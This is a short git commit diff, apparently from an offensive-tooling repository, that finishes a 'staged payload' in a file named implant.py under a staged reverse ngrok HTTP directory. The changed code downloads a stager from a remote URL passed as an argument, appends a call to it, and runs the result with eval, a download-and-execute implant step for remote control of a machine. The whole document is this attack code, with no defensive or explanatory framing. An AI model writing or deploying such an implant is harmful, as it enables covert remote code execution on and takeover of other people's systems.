10412c0db0a12fbe2f3e9919dba8dea8a50bd9ff
Marcus <marcus@marcusweinberger.com>
2018-06-15 14:39:33 +0100

    finished writing staged payload

--- staged_reverse_ngrok_http/implant.py
+++ staged_reverse_ngrok_http/implant.py
@@ -1,4 +1,6 @@
-import requests
+import requests; from time import sleep; from subprocess import Popen, PIPE; import os
 def main(argv=None):
-	exec(requests.get(argv[1]).content)
+	payload = requests.get(argv[1]+"/stager").content.decode()
+	payload += "\tmain(argv=['','%s'])" % argv[1]
+	eval(payload)
 if __name__ == "__main__":
